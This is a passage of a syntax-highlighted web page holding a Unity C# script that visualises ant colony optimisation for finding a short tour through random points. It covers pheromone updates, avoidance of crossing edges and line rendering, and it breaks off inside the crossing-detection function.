class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AntColonyOpt</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// min angle that the min path can have</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> angleOffset;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> crossTweakForce;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> crossDiv;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> bParticle;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> bDrawLine;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> emphasizeBest;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> numInGroup;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> preTimes;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> disPow;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> weightPow;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> dropPow;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> deltaPhe;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> pheMaxTimes;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> pheDrop;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> numPoint;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> xRange;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> yRange;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> minDis;</span><br><span class="line">    <span class="keyword">public</span> GameObject pointPrefab;</span><br><span class="line">    <span class="keyword">public</span> GameObject particalPrefab;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> preTimeLeft;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> Vector2[] pPos;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span>[] dis;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span>[] pheromone;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> pheMax;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> numPath;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> minPathDis;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span>[] minPath;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> bSpace;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> bAuto;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> bFirstRound;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> pheInit;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> pheMin;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> NowPath nowPath;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> minCrossCnt;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> CrossPath crossPath;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> LineRenderer lineRenderer;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Particle[] particles;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> turnCnt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">int</span> <span class="title">C2</span>(<span class="params"><span class="built_in">int</span> n</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="built_in">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; i --) result += i;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// passing the index of two point</span></span><br><span class="line">    <span class="comment">// return the index of the path connecting them</span></span><br><span class="line">    <span class="function"><span class="built_in">int</span> <span class="title">GetPathIndex</span>(<span class="params"><span class="built_in">int</span> cur1, <span class="built_in">int</span> cur2</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cur1 &gt; cur2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">int</span> tmp = cur1;</span><br><span class="line">            cur1 = cur2;</span><br><span class="line">            cur2 = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= cur1; i++) index += numPoint - i;</span><br><span class="line">        index += cur2 - cur1 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Awake</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        nowPath = FindObjectOfType&lt;NowPath&gt;();</span><br><span class="line">        crossPath = FindObjectOfType&lt;CrossPath&gt;();</span><br><span class="line">        <span class="comment">//numPath = (int)C(numPoint, 2);</span></span><br><span class="line">        numPath = C2(numPoint);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPath &amp;&amp; bParticle; i ++)</span><br><span class="line">            Instantiate(particalPrefab);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        turnCnt = <span class="number">0</span>;</span><br><span class="line">        preTimeLeft = <span class="number">0</span>;</span><br><span class="line">        bAuto = <span class="literal">false</span>;</span><br><span class="line">        bFirstRound = <span class="literal">true</span>;</span><br><span class="line">        pPos = <span class="keyword">new</span> Vector2[numPoint];</span><br><span class="line">        minPath = <span class="keyword">new</span> <span class="built_in">int</span>[numPoint];</span><br><span class="line">        <span class="built_in">float</span> sqrMinDis = minDis * minDis;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// gen random points</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            minPath[i] = i;</span><br><span class="line"></span><br><span class="line">            Vector2 pos = <span class="keyword">new</span> Vector2(Random.Range(-xRange, xRange), Random.Range(-yRange, yRange));</span><br><span class="line">            <span class="built_in">bool</span> tooClose = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">                <span class="keyword">if</span> ((pos - pPos[j]).sqrMagnitude &lt; sqrMinDis)</span><br><span class="line">                &#123;</span><br><span class="line">                    i--;</span><br><span class="line">                    tooClose = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">if</span> (tooClose) <span class="keyword">continue</span>;</span><br><span class="line">            GameObject point = Instantiate(pointPrefab);</span><br><span class="line">            point.transform.position = pos;</span><br><span class="line">            point.name = i.ToString();</span><br><span class="line">            pPos[i] = pos;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// calculate pheromone parameters</span></span><br><span class="line">        pheMax = deltaPhe * pheMaxTimes * numInGroup;</span><br><span class="line">        pheInit = pheMax / <span class="number">5</span>;</span><br><span class="line">        pheMin = pheInit * Mathf.Pow(pheDrop, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// initialization of arrays</span></span><br><span class="line">        pheromone = <span class="keyword">new</span> <span class="built_in">float</span>[numPath];</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPath; i++)</span><br><span class="line">            pheromone[i] = pheInit;</span><br><span class="line">        dis = <span class="keyword">new</span> <span class="built_in">float</span>[numPath];</span><br><span class="line">        particles = FindObjectsOfType&lt;Particle&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// calculate distance</span></span><br><span class="line">        <span class="comment">// set rotation and length of particles</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint - <span class="number">1</span>; i++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> j = i + <span class="number">1</span>; j &lt; numPoint; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">int</span> nowIndex = GetPathIndex(i, j);</span><br><span class="line">                dis[nowIndex] = (pPos[j] - pPos[i]).magnitude;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(bParticle)</span><br><span class="line">                &#123;</span><br><span class="line">                    particles[nowIndex].transform.position = pPos[i];</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">float</span> angle = Vector2.Angle(Vector2.up, pPos[j] - pPos[i]);</span><br><span class="line">                    <span class="keyword">if</span> (Vector3.Cross(Vector2.up, pPos[j] - pPos[i]).z &gt; <span class="number">0</span>) angle = -angle;</span><br><span class="line">                    particles[nowIndex].SetParticleRot(angle);</span><br><span class="line"></span><br><span class="line">                    particles[nowIndex].SetParticleDis(dis[nowIndex]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// initialize line renderer</span></span><br><span class="line">        lineRenderer = GetComponent&lt;LineRenderer&gt;();</span><br><span class="line">        lineRenderer.positionCount = numPoint + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        bSpace = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.W))</span><br><span class="line">        &#123;</span><br><span class="line">            preTimeLeft = preTimes;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (preTimeLeft &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            preTimeLeft--;</span><br><span class="line">            Opt();</span><br><span class="line">            <span class="keyword">if</span> (preTimeLeft == <span class="number">0</span>) print(<span class="string">&quot;preTimeFinished&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.Space))</span><br><span class="line">        &#123;</span><br><span class="line">            bSpace = <span class="literal">true</span>;</span><br><span class="line">            Opt();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.S))</span><br><span class="line">        &#123;</span><br><span class="line">            GameObject[] points = GameObject.FindGameObjectsWithTag(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                Destroy(points[i]);</span><br><span class="line">                nowPath.ClearPath();</span><br><span class="line">            &#125;</span><br><span class="line">            Start();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.A))</span><br><span class="line">        &#123;</span><br><span class="line">            print(<span class="string">&quot;AUTO&quot;</span>);</span><br><span class="line">            bAuto = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.D))</span><br><span class="line">        &#123;</span><br><span class="line">            print(<span class="string">&quot;MANUAL&quot;</span>);</span><br><span class="line">            bAuto = <span class="literal">false</span>;</span><br><span class="line">            print(turnCnt);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bAuto) Opt();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Opt</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        turnCnt++;</span><br><span class="line">        <span class="built_in">int</span>[] path = <span class="keyword">new</span> <span class="built_in">int</span>[numPoint * numInGroup];</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> antCnt = <span class="number">0</span>; antCnt &lt; numInGroup; antCnt++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// offset of starting point index</span></span><br><span class="line">            <span class="built_in">int</span> offset = Random.Range(<span class="number">0</span>, numPoint);</span><br><span class="line">            <span class="built_in">int</span> nowP = offset;</span><br><span class="line">            <span class="built_in">int</span> numVisited = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">bool</span>[] visited = <span class="keyword">new</span> <span class="built_in">bool</span>[numPoint];</span><br><span class="line">            visited[offset] = <span class="literal">true</span>;</span><br><span class="line">            path[numPoint * antCnt] = offset;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> turn = <span class="number">0</span>; turn &lt; numPoint - <span class="number">1</span>; turn++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">float</span>[] tempDis = <span class="keyword">new</span> <span class="built_in">float</span>[numPoint];</span><br><span class="line">                <span class="built_in">float</span>[] tempPhe = <span class="keyword">new</span> <span class="built_in">float</span>[numPoint];</span><br><span class="line">                <span class="built_in">float</span>[] weight = <span class="keyword">new</span> <span class="built_in">float</span>[numPoint];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    <span class="keyword">if</span> (!visited[i])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">int</span> nowIndex = GetPathIndex(nowP, i);</span><br><span class="line">                        <span class="built_in">float</span> nowDis = Mathf.Pow(<span class="number">1f</span> / dis[nowIndex], disPow);</span><br><span class="line">                        <span class="comment">// weight will be diveded by total then</span></span><br><span class="line">                        tempPhe[i] = pheromone[nowIndex];</span><br><span class="line">                        tempDis[i] = nowDis;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// calculate weight</span></span><br><span class="line">                <span class="built_in">float</span> totalWeight = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    <span class="keyword">if</span> (!visited[i])</span><br><span class="line">                    &#123;</span><br><span class="line">                        weight[i] = Mathf.Pow(tempDis[i] * tempPhe[i], weightPow);</span><br><span class="line">                        <span class="comment">// reduce chance of getting cross</span></span><br><span class="line">                        <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; numVisited - <span class="number">1</span>; j ++)</span><br><span class="line">                            <span class="keyword">if</span>(DetectCross(pPos[i], pPos[nowP], pPos[path[j + numPoint * antCnt]], pPos[path[j + <span class="number">1</span> + numPoint * antCnt]]))</span><br><span class="line">                                weight[i] /= crossDiv;</span><br><span class="line"></span><br><span class="line">                        totalWeight += weight[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    <span class="keyword">if</span> (!visited[i])</span><br><span class="line">                        weight[i] /= totalWeight;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Random.value returns in range [0,1]</span></span><br><span class="line">                <span class="built_in">float</span> choice = Random.<span class="keyword">value</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">int</span> decideIndex = offset;</span><br><span class="line">                <span class="built_in">int</span> maxCnt = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (maxCnt &lt; <span class="number">2</span> * numPoint)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">int</span> judgingIndex = decideIndex % numPoint;</span><br><span class="line">                    choice -= weight[judgingIndex];</span><br><span class="line">                    <span class="keyword">if</span> (choice &lt;= <span class="number">0</span> &amp;&amp; !visited[judgingIndex])</span><br><span class="line">                    &#123;</span><br><span class="line">                        numVisited++;</span><br><span class="line">                        path[numVisited + numPoint * antCnt] = judgingIndex;</span><br><span class="line">                        nowP = judgingIndex;</span><br><span class="line">                        visited[judgingIndex] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    decideIndex++;</span><br><span class="line">                    maxCnt++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// update when a turn is ending</span></span><br><span class="line">            <span class="keyword">if</span> (antCnt == numInGroup - <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">float</span> localMinPathDis = <span class="built_in">float</span>.MaxValue;</span><br><span class="line">                <span class="built_in">float</span>[] disGroup = <span class="keyword">new</span> <span class="built_in">float</span>[numInGroup];</span><br><span class="line">                <span class="built_in">int</span> localMinIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// get localMinPathDis and its index</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> antIndex = <span class="number">0</span>; antIndex &lt; numInGroup; antIndex++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                        disGroup[antIndex] += dis[GetPathIndex(path[i + numPoint * antIndex],</span><br><span class="line">                            (i + <span class="number">1</span>) % numPoint == <span class="number">0</span> ? path[numPoint * antIndex] : path[i + <span class="number">1</span> + numPoint * antIndex])];</span><br><span class="line">                    <span class="keyword">if</span> (disGroup[antIndex] &lt; localMinPathDis)</span><br><span class="line">                    &#123;</span><br><span class="line">                        localMinPathDis = disGroup[antIndex];</span><br><span class="line">                        localMinIndex = antIndex;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">int</span>[] localMinPath = <span class="keyword">new</span> <span class="built_in">int</span>[numPoint];</span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    localMinPath[i] = path[i + localMinIndex * numPoint];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(bFirstRound)</span><br><span class="line">                &#123;</span><br><span class="line">                    minPathDis = localMinPathDis;</span><br><span class="line">                    minCrossCnt = CountCross(localMinPath);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(bDrawLine) lineRenderer.SetPosition(i, pPos[localMinPath[i]]);</span><br><span class="line">                        minPath[i] = localMinPath[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(bDrawLine) lineRenderer.SetPosition(numPoint, pPos[localMinPath[<span class="number">0</span>]]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// pheromone drop</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPath; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    pheromone[i] *= pheDrop;</span><br><span class="line">                    <span class="keyword">if</span> (pheromone[i] &lt; pheMin) pheromone[i] = pheMin;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// add pheromone of the turn</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> antIndex = <span class="number">0</span>; antIndex &lt; numInGroup; antIndex++)</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">int</span> nowIndex = GetPathIndex(path[i + numPoint * antIndex], (i + <span class="number">1</span>) % numPoint == <span class="number">0</span></span><br><span class="line">                            ? path[numPoint * antIndex] : path[i + <span class="number">1</span> + numPoint * antIndex]);</span><br><span class="line">                        <span class="comment">// shorter path impacts pheromone more</span></span><br><span class="line">                        pheromone[nowIndex] += deltaPhe * Mathf.Pow(localMinPathDis / disGroup[antIndex], dropPow);</span><br><span class="line">                        <span class="keyword">if</span> (pheromone[nowIndex] &gt; pheMax) pheromone[nowIndex] = pheMax;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// emphasize best solution but avoid its crossing parts and small angle</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">int</span> cur1 = minPath[i];</span><br><span class="line">                    <span class="built_in">int</span> cur2 = (i + <span class="number">1</span>) % numPoint == <span class="number">0</span> ? minPath[<span class="number">0</span>] : minPath[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="built_in">int</span> nowIndex = GetPathIndex(cur1, cur2);</span><br><span class="line">                    pheromone[nowIndex] += deltaPhe * emphasizeBest;</span><br><span class="line">                    <span class="keyword">if</span> (pheromone[nowIndex] &gt; pheMax) pheromone[nowIndex] = pheMax;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// avoid crossing</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++)</span><br><span class="line">                        <span class="keyword">if</span> (DetectCross(pPos[cur1], pPos[cur2], pPos[minPath[j]], pPos[minPath[j + <span class="number">1</span>]]))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">int</span> anoIndex = GetPathIndex(minPath[j], minPath[j + <span class="number">1</span>]);</span><br><span class="line">                            pheromone[nowIndex] = pheMin;</span><br><span class="line">                            pheromone[anoIndex] = pheMin;</span><br><span class="line"></span><br><span class="line">                            pheromone[GetPathIndex(cur1, minPath[j])] += deltaPhe * crossTweakForce;</span><br><span class="line">                            <span class="keyword">if</span> (pheromone[GetPathIndex(cur1, minPath[j])] &gt; pheMax) pheromone[nowIndex] = pheMax;</span><br><span class="line">                            pheromone[GetPathIndex(cur2, minPath[j + <span class="number">1</span>])] += deltaPhe * crossTweakForce;</span><br><span class="line">                            <span class="keyword">if</span> (pheromone[GetPathIndex(cur2, minPath[j + <span class="number">1</span>])] &gt; pheMax) pheromone[nowIndex] = pheMax;</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="comment">// avoid small angle</span></span><br><span class="line">                    <span class="keyword">if</span> (i != <span class="number">0</span> &amp;&amp; DetectSmallAngle(pPos[cur1] - pPos[cur2], pPos[cur1] - pPos[minPath[i - <span class="number">1</span>]], angleOffset))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">int</span> anoIndex = GetPathIndex(minPath[i - <span class="number">1</span>], cur1);</span><br><span class="line"></span><br><span class="line">                        pheromone[nowIndex] -= deltaPhe * emphasizeBest;</span><br><span class="line">                        pheromone[anoIndex] -= deltaPhe * emphasizeBest;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// set particle size based on pheromone</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint &amp;&amp; bParticle; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">int</span> mostPheIndex = i + <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> j = i + <span class="number">1</span>; j &lt; numPoint; j++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">int</span> nowIndex = GetPathIndex(i, j);</span><br><span class="line">                        <span class="built_in">float</span> sizeRatio = (pheromone[nowIndex] - pheMin) / (pheMax - pheMin);</span><br><span class="line">                        particles[nowIndex].SetParticleSize(sizeRatio);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                    </span><br><span class="line">                <span class="comment">// update minPathDis and display</span></span><br><span class="line">                <span class="keyword">if</span> (localMinPathDis &lt; minPathDis)</span><br><span class="line">                &#123;</span><br><span class="line">                    minCrossCnt = CountCross(localMinPath);</span><br><span class="line">                    minPathDis = localMinPathDis;</span><br><span class="line">                    print(minPathDis);</span><br><span class="line">                    print(minCrossCnt);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(bDrawLine) lineRenderer.SetPosition(i, pPos[localMinPath[i]]);</span><br><span class="line">                        minPath[i] = localMinPath[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">if</span>(bDrawLine) lineRenderer.SetPosition(numPoint, pPos[localMinPath[<span class="number">0</span>]]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// show Recent Path</span></span><br><span class="line">                <span class="keyword">if</span> (bSpace &amp;&amp; !bParticle) nowPath.DrawNowPath(path, pPos, numPoint, localMinIndex);</span><br><span class="line"></span><br><span class="line">                bFirstRound = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">int</span> <span class="title">CountCross</span>(<span class="params"><span class="built_in">int</span>[] path</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="built_in">int</span> crossCnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">2</span>; i &lt; path.Length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Vector3 pA = pPos[path[i]];</span><br><span class="line">            Vector3 pB = pPos[i + <span class="number">1</span> == path.Length ? path[<span class="number">0</span>] : path[i + <span class="number">1</span>]];</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                Vector3 pC = pPos[path[j]];</span><br><span class="line">                Vector3 pD = pPos[path[j + <span class="number">1</span>]];</span><br><span class="line">                <span class="keyword">if</span>(DetectCross(pA, pB, pC, pD)) crossCnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> crossCnt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">bool</span> <span class="title">DetectCross</span>(<span class="params">Vector3 pA, Vector3 pB, Vector3 pC, Vector3 pD</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Vector3.Dot(Vector3.Cross(pA - pD, pC - pD), Vector3.Cross(pB - pD, pC - pD)) &lt; <span class="number">0</span></span><br><span class="line">            &amp;&amp; Vector3.Dot(Vector3.Cross(pC - pB, pA - pB), 